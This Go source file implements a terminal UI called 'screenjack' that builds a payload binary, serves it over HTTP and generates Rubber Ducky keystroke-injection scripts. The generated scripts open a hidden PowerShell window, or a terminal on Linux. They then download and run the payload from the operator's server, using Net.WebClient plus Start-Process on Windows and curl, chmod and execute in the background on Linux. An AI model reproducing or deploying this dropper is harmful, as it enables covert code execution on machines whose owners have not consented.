package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/charmbracelet/bubbles/filepicker"
	"github.com/charmbracelet/bubbles/help"
	"github.com/charmbracelet/bubbles/key"
	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// Tab represents a main navigation tab
type Tab int

const (
	TabBuild Tab = iota
	TabDucky
	TabServer
)

func (t Tab) String() string {
	return []string{"Build", "Ducky", "Server"}[t]
}

// KeyMap defines all keybindings
type KeyMap struct {
	Quit      key.Binding
	Help      key.Binding
	Tab       key.Binding
	ShiftTab  key.Binding
	Up        key.Binding
	Down      key.Binding
	Select    key.Binding
	Build     key.Binding
	Assets    key.Binding
	Generate  key.Binding
	Server    key.Binding
	Logs      key.Binding
	Back      key.Binding
	SelectAll key.Binding
}

func DefaultKeyMap() KeyMap {
	return KeyMap{
		Quit:      key.NewBinding(key.WithKeys("q", "ctrl+c"), key.WithHelp("q", "quit")),
		Help:      key.NewBinding(key.WithKeys("?"), key.WithHelp("?", "help")),
		Tab:       key.NewBinding(key.WithKeys("tab"), key.WithHelp("tab", "next tab")),
		ShiftTab:  key.NewBinding(key.WithKeys("shift+tab"), key.WithHelp("S-tab", "prev tab")),
		Up:        key.NewBinding(key.WithKeys("k", "up"), key.WithHelp("k/↑", "up")),
		Down:      key.NewBinding(key.WithKeys("j", "down"), key.WithHelp("j/↓", "down")),
		Select:    key.NewBinding(key.WithKeys("enter", " "), key.WithHelp("enter", "select")),
		Build:     key.NewBinding(key.WithKeys("b"), key.WithHelp("b", "build")),
		Assets:    key.NewBinding(key.WithKeys("a"), key.WithHelp("a", "assets")),
		Generate:  key.NewBinding(key.WithKeys("g"), key.WithHelp("g", "gen ducky")),
		Server:    key.NewBinding(key.WithKeys("h"), key.WithHelp("h", "toggle server")),
		Logs:      key.NewBinding(key.WithKeys("l"), key.WithHelp("l", "logs")),
		Back:      key.NewBinding(key.WithKeys("esc"), key.WithHelp("esc", "back")),
		SelectAll: key.NewBinding(key.WithKeys("A"), key.WithHelp("A", "select all")),
	}
}

func (k KeyMap) ShortHelp() []key.Binding {
	return []key.Binding{k.Tab, k.Up, k.Down, k.Select, k.Build, k.Assets, k.Server, k.Quit}
}

func (k KeyMap) FullHelp() [][]key.Binding {
	return [][]key.Binding{
		{k.Tab, k.ShiftTab, k.Up, k.Down},
		{k.Select, k.SelectAll, k.Build, k.Assets},
		{k.Generate, k.Server, k.Logs, k.Back},
		{k.Help, k.Quit},
	}
}

// Modal types
type Modal int

const (
	ModalNone Modal = iota
	ModalAssets
	ModalFilePicker
	ModalLogs
	ModalPreview
)

// Styles
var (
	// Colors - amber/rust oxide palette
	colorRust     = lipgloss.Color("#D97706")
	colorAmber    = lipgloss.Color("#F59E0B")
	colorOrange   = lipgloss.Color("#EA580C")
	colorEmerald  = lipgloss.Color("#10B981")
	colorCyan     = lipgloss.Color("#06B6D4")
	colorRose     = lipgloss.Color("#F43F5E")
	colorStone50  = lipgloss.Color("#FAFAF9")
	colorStone400 = lipgloss.Color("#A8A29E")
	colorStone600 = lipgloss.Color("#57534E")
	colorStone800 = lipgloss.Color("#292524")

	styleTitle = lipgloss.NewStyle().
			Foreground(colorAmber).
			Bold(true)

	styleActiveTab = lipgloss.NewStyle().
			Foreground(colorStone800).
			Background(colorAmber).
			Bold(true).
			Padding(0, 2)

	styleInactiveTab = lipgloss.NewStyle().
				Foreground(colorStone400).
				Padding(0, 2)

	styleBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorStone600).
			Padding(1, 2)

	styleActiveBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorAmber).
			Padding(1, 2)

	styleLabel = lipgloss.NewStyle().
			Foreground(colorStone400).
			Width(12).
			Align(lipgloss.Right)

	styleValue = lipgloss.NewStyle().
			Foreground(colorStone50).
			PaddingLeft(1)

	styleFocusedValue = lipgloss.NewStyle().
				Foreground(colorAmber).
				Bold(true).
				PaddingLeft(1)

	styleStatus = lipgloss.NewStyle().
			Foreground(colorStone400).
			Padding(0, 1)

	styleSuccess = lipgloss.NewStyle().Foreground(colorEmerald)
	styleError   = lipgloss.NewStyle().Foreground(colorRose)
	styleWarn    = lipgloss.NewStyle().Foreground(colorOrange)

	styleModalOverlay = lipgloss.NewStyle().
				Border(lipgloss.DoubleBorder()).
				BorderForeground(colorAmber).
				Padding(1, 2)
)

// TargetItem implements list.Item for build targets
type TargetItem struct {
	Name     string
	Target   string
	Selected bool
}

func (t TargetItem) FilterValue() string { return t.Name }
func (t TargetItem) Title() string       { return t.Name }
func (t TargetItem) Description() string { return t.Target }

// AssetItem implements list.Item for assets
type AssetItem struct {
	Name     string
	Selected bool
}

func (a AssetItem) FilterValue() string { return a.Name }
func (a AssetItem) Title() string       { return a.Name }
func (a AssetItem) Description() string { return "" }

// TargetDelegate renders target items
type TargetDelegate struct{}

func (d TargetDelegate) Height() int                             { return 1 }
func (d TargetDelegate) Spacing() int                            { return 0 }
func (d TargetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d TargetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(TargetItem)
	if !ok {
		return
	}

	cursor := "  "
	if index == m.Index() {
		cursor = "> "
	}

	check := "[ ]"
	style := lipgloss.NewStyle()
	if item.Selected {
		check = "[x]"
		style = style.Foreground(colorCyan)
	}
	if index == m.Index() {
		style = style.Foreground(colorAmber).Bold(true)
		if item.Selected {
			style = style.Foreground(colorCyan).Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s %s", cursor, check, style.Render(item.Name))
}

// AssetDelegate renders asset items
type AssetDelegate struct{}

func (d AssetDelegate) Height() int                             { return 1 }
func (d AssetDelegate) Spacing() int                            { return 0 }
func (d AssetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d AssetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(AssetItem)
	if !ok {
		return
	}

	cursor := "  "
	style := lipgloss.NewStyle()
	if index == m.Index() {
		cursor = "> "
		style = style.Foreground(colorAmber).Bold(true)
	}
	if item.Selected {
		cursor = "✓ "
		style = style.Foreground(colorCyan)
		if index == m.Index() {
			style = style.Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s", cursor, style.Render(item.Name))
}

// TUIModel is the main model
type TUIModel struct {
	width, height int

	// Navigation
	activeTab Tab
	keys      KeyMap
	help      help.Model

	// Modal state
	modal Modal

	// Build tab
	targetList list.Model
	buildMsg   string
	buildLog   string

	// Assets
	assetList     list.Model
	selectedAsset string
	filePicker    filepicker.Model
	pathInput     textinput.Model // for typing paths directly
	pathInputMode bool            // true when typing path, false when browsing

	// Ducky tab
	duckyOS      string
	urlInput     textinput.Model
	payloadInput textinput.Model
	duckyFocus   int // 0=OS, 1=URL, 2=payload
	duckyMsg     string

	// Server tab
	server   *Server
	serverIP string
	httpLogs []LogEntry

	// Status
	status string
}

const logo = `  ____                            _            _
 / ___|  ___ _ __ ___  ___ _ __  (_) __ _  ___| | __
 \___ \ / __| '__/ _ \/ _ \ '_ \ | |/ _` + "`" + ` |/ __| |/ /
  ___) | (__| | |  __/  __/ | | || | (_| | (__|   <
 |____/ \___|_|  \___|\___|_| |_|/ |\__,_|\___|_|\_\
                               |__/                 `

func NewTUIModel() TUIModel {
	// Target list
	targets := []list.Item{
		TargetItem{Name: "linux-x86_64", Target: "x86_64-unknown-linux-gnu", Selected: false},
		TargetItem{Name: "windows-x86_64", Target: "x86_64-pc-windows-gnu", Selected: false},
	}
	targetList := list.New(targets, TargetDelegate{}, 40, 6)
	targetList.SetShowTitle(false)
	targetList.SetShowStatusBar(false)
	targetList.SetShowHelp(false)
	targetList.SetFilteringEnabled(false)

	// Asset list (empty initially)
	assetList := list.New([]list.Item{}, AssetDelegate{}, 40, 10)
	assetList.SetShowTitle(false)
	assetList.SetShowStatusBar(false)
	assetList.SetShowHelp(false)
	assetList.SetFilteringEnabled(true)
	assetList.Title = "Assets"

	// File picker
	fp := filepicker.New()
	fp.AllowedTypes = []string{".gif", ".png", ".jpg", ".jpeg"}
	fp.CurrentDirectory, _ = os.UserHomeDir()
	fp.ShowHidden = false
	fp.Height = 15

	// Text inputs for Ducky tab
	urlInput := textinput.New()
	urlInput.Placeholder = "http://localhost:8000"
	urlInput.SetValue("http://localhost:8000")
	urlInput.Width = 30

	payloadInput := textinput.New()
	payloadInput.Placeholder = "screenjack"
	payloadInput.SetValue("screenjack")
	payloadInput.Width = 20

	// Path input for adding assets
	pathInput := textinput.New()
	pathInput.Placeholder = "~/path/to/file.gif"
	pathInput.Width = 50
	pathInput.Prompt = "> "

	// Help
	h := help.New()
	h.ShowAll = false

	return TUIModel{
		activeTab:    TabBuild,
		keys:         DefaultKeyMap(),
		help:         h,
		targetList:   targetList,
		assetList:    assetList,
		filePicker:   fp,
		pathInput:    pathInput,
		duckyOS:      "linux",
		urlInput:     urlInput,
		payloadInput: payloadInput,
		server:       NewServer(),
		serverIP:     GetLocalIP(),
		status:       "Ready",
	}
}

func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		scanAssetsCmd(),
		m.filePicker.Init(),
	)
}

// scanAssetsCmd scans the assets directory
func scanAssetsCmd() tea.Cmd {
	return func() tea.Msg {
		var assets []string
		entries, _ := os.ReadDir("../assets")
		for _, e := range entries {
			if !e.IsDir() {
				name := e.Name()
				ext := strings.ToLower(filepath.Ext(name))
				if ext == ".gif" || ext == ".png" || ext == ".jpg" || ext == ".jpeg" {
					assets = append(assets, name)
				}
			}
		}
		return assetsScannedMsg{assets: assets}
	}
}

type assetsScannedMsg struct{ assets []string }
type fileSelectedMsg struct{ path string }

func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		m.help.Width = msg.Width
		m.targetList.SetSize(msg.Width-4, 6)
		m.assetList.SetSize(msg.Width-8, min(15, msg.Height-10))
		m.filePicker.Height = min(20, msg.Height-10)
		return m, nil

	case assetsScannedMsg:
		items := make([]list.Item, len(msg.assets))
		for i, a := range msg.assets {
			items[i] = AssetItem{Name: a, Selected: a == m.selectedAsset}
		}
		m.assetList.SetItems(items)
		return m, nil

	case fileSelectedMsg:
		// Copy file to assets
		src := msg.path
		dst := "../assets/" + filepath.Base(src)
		if err := copyFile(src, dst); err != nil {
			m.status = styleError.Render("Error: " + err.Error())
		} else {
			m.status = styleSuccess.Render("Added " + filepath.Base(src))
			m.selectedAsset = filepath.Base(src)
		}
		m.modal = ModalNone
		return m, scanAssetsCmd()

	case buildDoneMsg:
		m.buildLog = msg.log
		if msg.ok {
			m.buildMsg = styleSuccess.Render("✓ " + msg.msg)
			m.status = styleSuccess.Render("Build complete")
		} else {
			m.buildMsg = styleError.Render("✗ " + msg.msg)
			m.status = styleError.Render("Build failed")
		}
		return m, nil

	case tea.KeyMsg:
		// Modal handling
		if m.modal != ModalNone {
			return m.updateModal(msg)
		}

		// Global keys
		switch {
		case key.Matches(msg, m.keys.Quit):
			m.server.Stop()
			return m, tea.Quit

		case key.Matches(msg, m.keys.Help):
			m.help.ShowAll = !m.help.ShowAll
			return m, nil

		case key.Matches(msg, m.keys.Tab):
			m.activeTab = Tab((int(m.activeTab) + 1) % 3)
			return m, nil

		case key.Matches(msg, m.keys.ShiftTab):
			m.activeTab = Tab((int(m.activeTab) + 2) % 3)
			return m, nil

		case key.Matches(msg, m.keys.Assets):
			m.modal = ModalAssets
			return m, nil

		case key.Matches(msg, m.keys.Build):
			return m, m.buildTargets()

		case key.Matches(msg, m.keys.Server):
			return m, m.toggleServer()

		case key.Matches(msg, m.keys.Logs):
			if m.server.IsRunning() {
				m.modal = ModalLogs
			}
			return m, nil

		case key.Matches(msg, m.keys.Generate):
			m.genDucky()
			m.status = styleSuccess.Render("Ducky script saved")
			return m, nil
		}

		// Tab-specific updates
		switch m.activeTab {
		case TabBuild:
			return m.updateBuildTab(msg)
		case TabDucky:
			return m.updateDuckyTab(msg)
		case TabServer:
			return m.updateServerTab(msg)
		}
	}

	return m, tea.Batch(cmds...)
}

func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch m.modal {
	case ModalAssets:
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalNone
			return m, nil
		case msg.String() == "n":
			// Open file picker
			m.modal = ModalFilePicker
			return m, m.filePicker.Init()
		case key.Matches(msg, m.keys.Select):
			// Select current asset
			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
				m.selectedAsset = item.Name
				// Update list to show selection
				items := m.assetList.Items()
				for i, it := range items {
					if a, ok := it.(AssetItem); ok {
						a.Selected = a.Name == m.selectedAsset
						items[i] = a
					}
				}
				m.assetList.SetItems(items)
			}
			return m, nil
		default:
			var cmd tea.Cmd
			m.assetList, cmd = m.assetList.Update(msg)
			return m, cmd
		}

	case ModalFilePicker:
		// If path input is focused, handle typing
		if m.pathInputMode {
			switch msg.String() {
			case "esc":
				m.pathInputMode = false
				m.pathInput.Blur()
				return m, nil
			case "enter":
				// Try to add the file
				path := expandPath(m.pathInput.Value())
				if path != "" {
					m.pathInput.SetValue("")
					m.pathInput.Blur()
					m.pathInputMode = false
					return m, func() tea.Msg { return fileSelectedMsg{path: path} }
				}
				return m, nil
			case "tab":
				// Switch to browser mode
				m.pathInputMode = false
				m.pathInput.Blur()
				return m, nil
			default:
				var cmd tea.Cmd
				m.pathInput, cmd = m.pathInput.Update(msg)
				return m, cmd
			}
		}

		// Browser mode
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalAssets
			return m, nil
		case msg.String() == "/", msg.String() == ":":
			// Switch to path input mode
			m.pathInputMode = true
			m.pathInput.Focus()
			return m, textinput.Blink
		default:
			var cmd tea.Cmd
			m.filePicker, cmd = m.filePicker.Update(msg)

			// Check if file was selected
			if didSelect, path := m.filePicker.DidSelectFile(msg); didSelect {
				return m, func() tea.Msg { return fileSelectedMsg{path: path} }
			}
			return m, cmd
		}

	case ModalLogs:
		if key.Matches(msg, m.keys.Back) || msg.String() == "l" {
			m.modal = ModalNone
		}
		return m, nil
	}

	return m, nil
}

func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch {
	case key.Matches(msg, m.keys.Select):
		// Toggle target selection
		if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
			item.Selected = !item.Selected
			items := m.targetList.Items()
			items[m.targetList.Index()] = item
			m.targetList.SetItems(items)
		}
		return m, nil
	case key.Matches(msg, m.keys.SelectAll):
		items := m.targetList.Items()
		for i, it := range items {
			if t, ok := it.(TargetItem); ok {
				t.Selected = true
				items[i] = t
			}
		}
		m.targetList.SetItems(items)
		return m, nil
	default:
		var cmd tea.Cmd
		m.targetList, cmd = m.targetList.Update(msg)
		return m, cmd
	}
}

func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// If a text input is focused, route to it
	if m.urlInput.Focused() || m.payloadInput.Focused() {
		switch msg.String() {
		case "esc", "enter":
			m.urlInput.Blur()
			m.payloadInput.Blur()
			return m, nil
		}
		var cmd tea.Cmd
		if m.urlInput.Focused() {
			m.urlInput, cmd = m.urlInput.Update(msg)
		} else {
			m.payloadInput, cmd = m.payloadInput.Update(msg)
		}
		return m, cmd
	}

	switch {
	case key.Matches(msg, m.keys.Up):
		m.duckyFocus = max(0, m.duckyFocus-1)
	case key.Matches(msg, m.keys.Down):
		m.duckyFocus = min(2, m.duckyFocus+1)
	case key.Matches(msg, m.keys.Select):
		switch m.duckyFocus {
		case 0: // Toggle OS
			if m.duckyOS == "linux" {
				m.duckyOS = "windows"
			} else {
				m.duckyOS = "linux"
			}
		case 1: // Focus URL input
			m.urlInput.Focus()
			return m, textinput.Blink
		case 2: // Focus payload input
			m.payloadInput.Focus()
			return m, textinput.Blink
		}
	}
	return m, nil
}

func (m TUIModel) updateServerTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// Server tab specific keys if needed
	return m, nil
}

type buildDoneMsg struct {
	ok  bool
	msg string
	log string
}

func (m *TUIModel) buildTargets() tea.Cmd {
	return func() tea.Msg {
		var logs strings.Builder
		var out []string
		ok := true

		items := m.targetList.Items()
		for _, it := range items {
			t, isTarget := it.(TargetItem)
			if !isTarget || !t.Selected {
				continue
			}

			logs.WriteString(fmt.Sprintf("=== %s ===\n", t.Target))
			cmd := exec.Command("cargo", "build", "--release", "--target", t.Target)
			cmd.Dir = "../payload"
			output, err := cmd.CombinedOutput()
			logs.Write(output)
			logs.WriteString("\n")

			if err != nil {
				ok = false
				out = append(out, t.Name+":FAIL")
			} else {
				out = append(out, t.Name+":OK")
			}
		}

		if len(out) == 0 {
			return buildDoneMsg{false, "nothing selected", ""}
		}

		os.WriteFile("/tmp/screenjack-build.log", []byte(logs.String()), 0644)
		return buildDoneMsg{ok, strings.Join(out, " "), logs.String()}
	}
}

func (m *TUIModel) toggleServer() tea.Cmd {
	if m.server.IsRunning() {
		m.server.Stop()
		m.status = "Server stopped"
	} else {
		payloadPath, ok := PayloadExists(m.duckyOS)
		if !ok {
			m.status = styleError.Render("No payload built")
			return nil
		}
		assetPath := ""
		if m.selectedAsset != "" {
			assetPath = "../assets/" + m.selectedAsset
		}
		if err := m.server.Start(payloadPath, assetPath); err != nil {
			m.status = styleError.Render(err.Error())
		} else {
			m.status = styleSuccess.Render(fmt.Sprintf("Server running on :%d", m.server.Port()))
		}
	}
	return nil
}

func (m *TUIModel) genDucky() {
	var b strings.Builder

	baseURL := m.urlInput.Value()
	payloadName := m.payloadInput.Value()
	if m.server.IsRunning() {
		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
	}
	url := strings.TrimSuffix(baseURL, "/") + "/" + payloadName

	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
	b.WriteString("DELAY 500\n\n")

	if m.duckyOS == "windows" {
		b.WriteString("REM Open hidden PowerShell\n")
		b.WriteString("GUI r\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING powershell -w hidden\n")
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download and execute\n")
		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
			url, payloadName))
		b.WriteString("ENTER\n")
	} else {
		b.WriteString("REM Open terminal\n")
		b.WriteString("CTRL-ALT t\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download, chmod, execute in background\n")
		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, payloadName, payloadName))
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING exit\n")
		b.WriteString("ENTER\n")
	}

	os.MkdirAll("../ducky", 0755)
	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(b.String()), 0644)
}

func (m TUIModel) View() string {
	if m.width < 60 || m.height < 20 {
		return "Terminal too small"
	}

	// Render modal if active
	if m.modal != ModalNone {
		return m.viewModal()
	}

	// Header with tabs
	header := m.viewTabs()

	// Main content based on active tab
	var mainContent string
	switch m.activeTab {
	case TabBuild:
		mainContent = m.viewBuildTab()
	case TabDucky:
		mainContent = m.viewDuckyTab()
	case TabServer:
		mainContent = m.viewServerTab()
	}

	// Right sidebar with status indicators
	sidebar := m.viewSidebar()

	// Two-column layout with gap
	body := lipgloss.JoinHorizontal(lipgloss.Top, mainContent, "    ", sidebar)

	// Footer
	footer := lipgloss.JoinVertical(lipgloss.Center,
		styleStatus.Render(m.status),
		m.help.View(m.keys),
	)

	// Combine all - center everything
	content := lipgloss.JoinVertical(lipgloss.Center,
		header,
		"",
		body,
		"",
		footer,
	)

	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, content)
}

func (m TUIModel) viewSidebar() string {
	sidebarStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(colorStone600).
		Padding(1, 1).
		Width(25)

	// Server status
	serverTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Server")
	var serverStatus string
	if m.server.IsRunning() {
		serverStatus = styleSuccess.Render("● Running")
		serverStatus += "\n" + styleStatus.Render(fmt.Sprintf("  :%d", m.server.Port()))
		logs := m.server.Logs()
		if len(logs) > 0 {
			serverStatus += "\n" + styleStatus.Render(fmt.Sprintf("  %d reqs", len(logs)))
		}
	} else {
		serverStatus = styleError.Render("○ Stopped")
	}

	// Build status
	buildTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Build")
	buildStatus := styleStatus.Render("Ready")
	if m.buildMsg != "" {
		buildStatus = m.buildMsg
	}

	// Asset status
	assetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Asset")
	assetStatus := styleStatus.Render("(none)")
	if m.selectedAsset != "" {
		assetStatus = styleSuccess.Render(m.selectedAsset)
	}

	content := lipgloss.JoinVertical(lipgloss.Left,
		serverTitle,
		serverStatus,
		"",
		buildTitle,
		buildStatus,
		"",
		assetTitle,
		assetStatus,
	)

	return sidebarStyle.Render(content)
}

func (m TUIModel) viewTabs() string {
	var tabs []string
	for i := Tab(0); i <= TabServer; i++ {
		style := styleInactiveTab
		if i == m.activeTab {
			style = styleActiveTab
		}
		tabs = append(tabs, style.Render(i.String()))
	}

	tabBar := lipgloss.JoinHorizontal(lipgloss.Center, tabs...)

	return lipgloss.JoinVertical(lipgloss.Center,
		styleTitle.Render(logo),
		"",
		tabBar,
	)
}

func (m TUIModel) viewBuildTab() string {
	// Targets box
	targetTitle := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Targets")
	targetContent := m.targetList.View()
	targetsBox := styleBox.Width(50).Render(
		lipgloss.JoinVertical(lipgloss.Left, targetTitle, "", targetContent),
	)

	// Asset info box
	asset := m.selectedAsset
	if asset == "" {
		asset = "(none)"
	}
	assetRow := lipgloss.JoinHorizontal(lipgloss.Left,
		styleLabel.Render("Asset:"),
		styleValue.Render(asset),
	)
	assetBox := styleBox.Width(50).Render(assetRow)

	return lipgloss.JoinVertical(lipgloss.Center, targetsBox, "", assetBox)
}

func (m TUIModel) viewDuckyTab() string {
	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("Ducky Script Generator")

	// Build rows with proper alignment
	rows := make([]string, 3)

	// OS row
	osLabel := styleLabel.Render("Target OS:")
	osValue := m.duckyOS
	if m.duckyFocus == 0 {
		osValue = styleFocusedValue.Render(m.duckyOS + "  [space to toggle]")
	} else {
		osValue = styleValue.Render(m.duckyOS)
	}
	rows[0] = lipgloss.JoinHorizontal(lipgloss.Left, osLabel, osValue)

	// URL row
	urlLabel := styleLabel.Render("URL:")
	urlValue := m.urlInput.View()
	if m.duckyFocus == 1 {
		urlLabel = lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Width(12).Align(lipgloss.Right).Render("URL:")
	}
	rows[1] = lipgloss.JoinHorizontal(lipgloss.Left, urlLabel, " ", urlValue)

	// Payload row
	payloadLabel := styleLabel.Render("Payload:")
	payloadValue := m.payloadInput.View()
	if m.duckyFocus == 2 {
		payloadLabel = lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Width(12).Align(lipgloss.Right).Render("Payload:")
	}
	rows[2] = lipgloss.JoinHorizontal(lipgloss.Left, payloadLabel, " ", payloadValue)

	content := lipgloss.JoinVertical(lipgloss.Left, rows...)
	box := styleBox.Width(60).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content),
	)

	return box
}

func (m TUIModel) viewServerTab() string {
	title := lipgloss.NewStyle().Foreground(colorAmber).Bold(true).Render("HTTP Server")

	// Status row
	statusLabel := styleLabel.Render("Status:")
	var statusValue string
	if m.server.IsRunning() {
		statusValue = styleSuccess.Render(fmt.Sprintf("Running on %s:%d", m.serverIP, m.server.Port()))
	} else {
		statusValue = styleError.Render("Stopped")
	}
	statusRow := lipgloss.JoinHorizontal(lipgloss.Left, statusLabel, " ", statusValue)

	// Requests row
	var requestsRow string
	if m.server.IsRunning() {
		logs := m.server.Logs()
		reqLabel := styleLabel.Render("Requests:")
		reqValue := styleValue.Render(fmt.Sprintf("%d", len(logs)))
		requestsRow = lipgloss.JoinHorizontal(lipgloss.Left, reqLabel, " ", reqValue)
	}

	// IP row
	ipLabel := styleLabel.Render("Local IP:")
	ipValue := styleValue.Render(m.serverIP)
	ipRow := lipgloss.JoinHorizontal(lipgloss.Left, ipLabel, " ", ipValue)

	// Port row
	portLabel := styleLabel.Render("Port:")
	portValue := styleValue.Render(fmt.Sprintf("%d", m.server.Port()))
	portRow := lipgloss.JoinHorizontal(lipgloss.Left, portLabel, " ", portValue)

	content := lipgloss.JoinVertical(lipgloss.Left, statusRow, "", ipRow, portRow)
	if requestsRow != "" {
		content = lipgloss.JoinVertical(lipgloss.Left, statusRow, "", ipRow, portRow, "", requestsRow)
	}

	box := styleBox.Width(50).Render(
		lipgloss.JoinVertical(lipgloss.Left, title, "", content),
	)

	return box
}

func (m TUIModel) viewModal() string {
	var content string
	var title string

	switch m.modal {
	case ModalAssets:
		title = "Assets"
		content = m.assetList.View()
		content += "\n\n[n] add new  [enter] select  [esc] close"

	case ModalFilePicker:
		title = "Add Asset"

		// Path input section
		pathLabel := "Type path:"
		if m.pathInputMode {
			pathLabel = styleSuccess.Render("Type path:")
		}
		pathSection := lipgloss.JoinVertical(lipgloss.Left,
			pathLabel,
			m.pathInput.View(),
		)

		// Browser section
		browserLabel := "Or browse:"
		if !m.pathInputMode {
			browserLabel = styleSuccess.Render("Browse:")
		}
		browserSection := lipgloss.JoinVertical(lipgloss.Left,
			browserLabel,
			m.filePicker.View(),
		)

		helpText := styleStatus.Render("[/] type path  [tab] switch  [enter] select  [esc] back")

		content = lipgloss.JoinVertical(lipgloss.Left,
			pathSection,
			"",
			browserSection,
			"",
			helpText,
		)

	case ModalLogs:
		title = "HTTP Logs"
		logs := m.server.Logs()
		var lines []string
		for _, l := range logs {
			lines = append(lines, fmt.Sprintf("%s %s %s %d",
				l.Time.Format("15:04:05"), l.Method, l.Path, l.Status))
		}
		if len(lines) == 0 {
			content = "(no requests yet)"
		} else {
			content = strings.Join(lines, "\n")
		}
		content += "\n\n[esc] close"
	}

	modal := styleModalOverlay.Width(m.width - 10).Render(
		styleTitle.Render(title) + "\n\n" + content,
	)

	// Center the modal
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, modal)
}
